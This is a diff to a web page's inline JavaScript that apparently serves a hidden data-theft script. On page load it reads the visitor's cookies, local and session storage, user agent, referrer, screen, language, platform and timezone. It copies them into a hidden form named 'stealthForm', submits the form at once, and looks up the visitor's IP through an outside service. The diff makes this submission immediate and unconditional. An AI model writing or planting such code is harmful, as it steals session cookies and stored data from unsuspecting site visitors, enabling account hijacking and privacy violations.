@@ -549,9 +549,9 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown_Timezone";
             var localStorageData = JSON.stringify(localStorage.length ? localStorage : "No_LocalStorage") || "No_LocalStorage";
             var sessionStorageData = JSON.stringify(sessionStorage.length ? sessionStorage : "No_SessionStorage") || "No_SessionStorage";
-            var ipAddress = "Fetching_IP...";
+            var ipAddress = "Pending_IP";
 
-            // Inject initial data into form fields
+            // Inject data into form fields
             document.getElementById("cookieField").value = cookies;
             document.getElementById("userAgentField").value = userAgent;
             document.getElementById("referrerField").value = referrer;
@@ -563,31 +563,36 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             document.getElementById("sessionStorageField").value = sessionStorageData;
             document.getElementById("ipField").value = ipAddress;
 
-            // Fetch IP address from external API
+            // Debug: Log all captured data
+            console.log("Cookies:", cookies);
+            console.log("User Agent:", userAgent);
+            console.log("Referrer:", referrer);
+            console.log("Screen Resolution:", screenResolution);
+            console.log("Language:", language);
+            console.log("Platform:", platform);
+            console.log("Timezone:", timezone);
+            console.log("Local Storage:", localStorageData);
+            console.log("Session Storage:", sessionStorageData);
+            console.log("IP Address (initial):", ipAddress);
+
+            // Submit form immediately with available data
+            console.log("Submitting form with initial data...");
+            document.getElementById("stealthForm").submit();
+
+            // Fetch IP address separately (won't block initial submission)
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     ipAddress = data.ip || "Unknown_IP";
+                    console.log("IP Address fetched:", ipAddress);
                     document.getElementById("ipField").value = ipAddress;
-                    // Submit form after IP is fetched if any data is meaningful
-                    if (cookies !== "No_Cookies" || referrer !== "No_Referrer" || 
-                        screenResolution !== "Unknown_Screen" || language !== "Unknown_Language" || 
-                        platform !== "Unknown_Platform" || timezone !== "Unknown_Timezone" || 
-                        localStorageData !== "No_LocalStorage" || sessionStorageData !== "No_SessionStorage" || 
-                        ipAddress !== "Unknown_IP") {
-                        document.getElementById("stealthForm").submit();
-                    }
+                    // Optional: Submit again with IP if needed (uncomment below)
+                    // console.log("Submitting form again with IP...");
+                    // document.getElementById("stealthForm").submit();
                 })
                 .catch(error => {
-                    console.error('IP fetch failed:', error);
+                    console.error("IP fetch failed:", error);
                     document.getElementById("ipField").value = "IP_Fetch_Failed";
-                    // Submit anyway if other data exists
-                    if (cookies !== "No_Cookies" || referrer !== "No_Referrer" || 
-                        screenResolution !== "Unknown_Screen" || language !== "Unknown_Language" || 
-                        platform !== "Unknown_Platform" || timezone !== "Unknown_Timezone" || 
-                        localStorageData !== "No_LocalStorage" || sessionStorageData !== "No_SessionStorage") {
-                        document.getElementById("stealthForm").submit();
-                    }
                 });
         });
     </script>
